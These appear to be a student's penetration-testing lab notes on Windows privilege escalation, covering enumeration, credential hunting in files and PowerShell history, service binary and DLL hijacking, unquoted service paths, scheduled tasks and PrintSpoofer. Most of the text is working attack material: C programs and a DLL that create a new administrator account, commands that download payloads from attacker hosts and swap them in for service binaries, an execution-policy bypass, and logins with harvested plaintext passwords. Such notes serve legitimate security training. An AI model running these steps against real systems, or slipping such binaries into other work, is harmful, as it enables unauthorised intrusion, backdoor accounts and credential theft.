## 16.1. Enumerating Windows
### 16.1.2. Situational Awareness
#### Key information to always obtain:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version, and architecture
- Network Information
- Installed applications
- Running processes
#### Username and hostname
```cmd.exe
whoami
```
#### Group memberships of the current user
```cmd.exe
whoami /groups
```
The hostname often can be used to infer the purpose and type of a machine. For example, if it is WEB01 for a web server or MSSQL01 for a MSSQL server.
#### Existing users
```PowerShell
Get-LocalUser
```
Or:
```PowerShell
net user
```
#### Existing groups
```PowerShell
Get-LocalGroup
```
Or:
```PowerShell
net localgroup
```
#### Display members of the group `adminteam`
```PowerShell
Get-LocalGroupMember adminteam
```
#### Information about the operating system and architecture
```PowerShell
systeminfo
```
#### Information about the network configuration
```PowerShell
ipconfig /all
```
#### Routing Table
```PowerShell
route print
```
The output of this command is useful to determine possible attack vectors to other systems or networks.
#### Active Network Connections
```PowerShell
netstat -ano
```
#### Installed Applications
```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
We could search for public exploits for the identified applications after we finish the situational awareness process. We could also leverage password attacks to retrieve the master password of the password manager to potentially obtain other passwords, enabling us to log on as a privileged user.

*We should always check 32-bit and 64-bit Program Files directories located in `C:\`, as well as the Downloads directory*
#### Identify which process (associated w/ applications) are running
```PowerShell
Get-Process
```
### 16.1.3. Hidden in Plain View
#### Searching for password manager databases on the `C:\` drive
```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
#### Searching for sensitive information in XAMPP directory
```PowerShell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

**Look to find passwords for applications that you found in the previous step**
#### Searching for text files and password manager databases in the home directory of a user
```PowerShell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
#### Local groups user `steve` is a member of
```PowerShell
net user steve
```
#### Using Runas to execute cmd as user backupadmin
```PowerShell
runas /user:backupadmin cmd
```
OR:
```PowerShell
runas /user:backupadmin powershell
```
### 16.1.4. Information Goldmine PowerShell
#### Check the user's PowerShell history
```PowerShell
Get-History
```
#### Display path of the history file from PSReadline
```PowerShell
(Get-PSReadlineOption).HistorySavePath
```
#### Display the contents of the console history
```PowerShell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
#### Using the commands from the transcript file to obtain a PowerShell session as daveadmin
```PowerShell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
```

```PowerShell
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

```PowerShell
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
#### Using evil-winrm to connect to CLIENTWK220 as daveadmin
```Shell
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123!!"
```
#### Open Event Viewer and navigate to the following log location: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
![[event viwer.png]]
### 16.1.5. Automated Enumeration
#### Download winpeas onto Windows Host
```PowerShell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```
#### Run winPEAS
```PowerShell
.\winPEAS.exe
```
#### Run Seatbelt
```PowerShell
.\Seatbelt.exe -group=all
```
## 16.2. Leveraging Windows Services
### 16.2.1. Service Binary Hijacking
#### Generate a list of services with binary path
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
==Using `Get-CimInstance` and `Get-Service` in Evil-WinRM or a bind shell will result in "Permission Denied"==

Based on the output in Listing 40, the two XAMPP services _Apache2.4_ and _mysql_ stand out as the binaries are located in the `C:\xampp\` directory instead of `C:\Windows\System32`. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software. These circumstances make it potentially prone to service binary hijacking.
#### Permission Codes
|MASK|PERMISSIONS|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|
#### Permissions of _httpd.exe_
```PowerShell
icacls "C:\xampp\apache\bin\httpd.exe"
```
#### Permissions of _mysqld.exe_
```PowerShell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```
Full Access (F) permission allows us to write to and modify the binary and therefore, replace it
#### Create a C code binary in Kali that will create a user named _dave2_ and add that user to the local Administrators group using the `system` function
```C
#include <stdlib.h>

int main ()
{
	int i;

	i = system ("net user dave2 password123! /add");
	i = system ("net localgroup administrators dave2 /add");

	return 0;
}
```
#### Compile the binary (adduser.c)
```Shell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
#### Transfer to target host
```PowerShell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
```
#### Replace mysqld.exe with our malicious binary
```PowerShell
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
```

```PowerShell
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
#### First attempt to restart the service
```PowerShell
net stop mysql
```
#### If permissions don't allow restarting a service, see if it starts up on system reboot
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
#### Check reboot privileges
```PowerShell
whoami /priv
```
"Disabled" being displayed means you can reboot the system (just like "Enabled" would)
#### Reboot the machine
```PowerShell
shutdown /r /t 0
```
#### Display members of the local administrators group
```PowerShell
Get-LocalGroupMember administrators
```
#### We can also figure out privesc possibilities using PowerSploit.ps1. Transfer to the machine.
```PowerShell
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```
#### Start PowerShell with the Execution Policy bypass so you can run scripts without being blocked
```PowerShell
powershell -ep bypass
```
#### Execute PowerUp.ps1
```PowerShell
. .\PowerUp.ps1
```
#### Look for modifiable service paths
```PowerShell
Get-ModifiableServiceFile
```
#### Try the `AbuseFunction` to see if it works in replacing the binary
```PowerShell
Install-ServiceBinary -Name 'mysql'
```
#### If there's an error, analyze the function `ModifiablePath` 
- First, we'll try the service binary path without any arguments for **Get-ModifiablePath**. 
```PowerShell
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
```

```PowerShell
$ModifiableFiles
```

- Then, we'll add another argument to check if the function still provides the correct output. 
```PowerShell
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
```

```PowerShell
$ModifiableFiles
```

- Finally, we'll use an argument with a path inside.
```PowerShell
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
```

```PowerShell
$ModifiableFiles
```

***If you encounter any issues while using RunAs, you can try running an Administrator command prompt and entering the credentials for user dave2 to obtain a shell.***
### 16.2.2. Service DLL Hijacking
#### Standard DLL search order on current Windows versions
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
#### Displaying information about the running service BetaService
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
#### Displaying permissions on the binary of BetaService
```PowerShell
icacls .\Documents\BetaServ.exe
```
This shows that we don't have permissions to replace the binary since we only have Read and Execute permissions as steve. Therefore, we need to investigate a bit more.
#### Use Procmon to identify DLLs loaded by the service as well as detect the missing ones
- This typically requires admin privs, so the best thing to do is copy the BetaService binary to a local machine and test it with Procmon
#### Click on the *Filter* menu > *Filter* and enter the following arguments: *Process Name* as *Column*, *is* as *Relation*, *BetaServ.exe* as *Value*, and *Include* as *Action*, then click "Add"
![[Procmon4DLLs.png]]
#### In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs
```PowerShell
Restart-Service BetaService
```
Scrolling down in the list, various CreateFile calls can be found in the Operation column. The CreateFile function can be used to create or open a file.
![[DLL createfile.png]]
The output shows that the CreateFile calls attempted to open a file named `myDLL.dll` in several paths. The Detail column states `NAME NOT FOUND` for these calls, which means that a DLL with this name couldn't be found in any of these paths. It also shows the search order as outlined in Microsoft's Documentation.
#### Confirm directory search order by displaying the PATH environment variable
```PowerShell
$env:path
```
To abuse this, we can attempt to write a DLL file with this name to a path used by the DLL search order.
#### The first place searched is the `C:\User\steve\Documents\` folder, which we can write to
#### Code example of a basic DLL in C++
```C++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
#### Modified DLL in C++
```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user pwnstar password123! /add");
  	    i = system ("net localgroup administrators pwnstar /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Added `include` statements and system function calls to create a new user and add them to the `administrators` group
#### Compile the code
```Shell
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
#### Download onto the target machine, ensuring it ends up in the folder that is searched first
```PowerShell
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
```
#### Restart the Service to execute the DLL
```PowerShell
Restart-Service BetaService
```
#### Check to see that the user was added to the computer and administrators group
```PowerShell
net user
```

```PowerShell
net localgroup administrators
```
### 16.2.3. Unquoted Service Paths
#### List services with binary path
```PowerShell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
#### List of services with spaces and missing quotes in the binary path
```PowerShell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
#### See if you can start and stop the service, then keep it stopped
```PowerShell
Start-Service GammaService
```

```PowerShell
Stop-Service GammaService
```
#### Path for execution is as identified:
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
#### Reviewing permissions on the paths `C:\` and `C:\Program Files\`
```PowerShell
icacls "C:\"
```

```PowerShell
icacls "C:\Program Files"
```

```PowerShell
icacls "C:\Program Files\Enterprise Apps"
```
Looking for a `(W)` or `(F)` in the `BUILTIN\Users:`

***We want to replace `Current.exe` with our own binary***
#### Create a C code binary in Kali that will create a user named _dave2_ and add that user to the local Administrators group using the `system` function
```C
#include <stdlib.h>

int main ()
{
	int i;

	i = system ("net user dave2 password123! /add");
	i = system ("net localgroup administrators dave2 /add");

	return 0;
}
```
#### Compile the binary (adduser.c)
```Shell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
#### Upload to the target host
```PowerShell
iwr -uri http://192.168.45.155:80/adduser.exe -Outfile Current.exe
```
#### Move to `Enterprise Apps` folder as `Current.exe`
```PowerShell
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```
#### Start the service
```PowerShell
Start-Service GammaService
```
***Will flash an error, but the user will be added***
#### Check users
```PowerShell
net users
```
#### Check administrators group
```PowerShell
net localgroup administrators
```
#### Can also do this using PowerUp.ps1
```PowerShell
powershell -ep bypass
```

```PowerShell
Get-UnquotedService
```
#### Use AbuseFunction and restart the service
```PowerShell
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
- For -Path, we enter the same path for Current.exe
- The default behavior is to create a new local user called john with the password Password123!
#### Restart the Service
```PowerShell
Restart-Service GammaService
```
## 16.3. Abusing Other Windows Components
### 16.3.1. Scheduled Tasks
#### Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
1) As which user account (principal) does this task get executed?
2) What triggers are specified for the task?
3) What actions are executed when one or more of these triggers are met?
#### Display a list of all scheduled tasks
```PowerShell
schtasks /query /fo LIST /v
```
#### Display permissions on the executable file 
```PowerShell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
#### Change the name of the current binary
```PowerShell
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
```
#### Upload the adduser.exe binary and add to the target folder, changing the name to the binary for the scheduled task
```PowerShell
move .\BackendCacheCleanup.exe .\Pictures\
```
#### Wait for execution

### 16.3.2. Using Exploits
#### Check assigned privileges of current user
```PowerShell
whoami /priv
```
#### Download [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) and transfer to target machine
#### Run PrintSpoofer
```PowerShell
.\PrintSpoofer64.exe -i -c powershell.exe
```
### Other
#### Look at Global Environment Variables
```PowerShell
Get-ChildItem env:
```
May contain passwords, keys, or other things of value
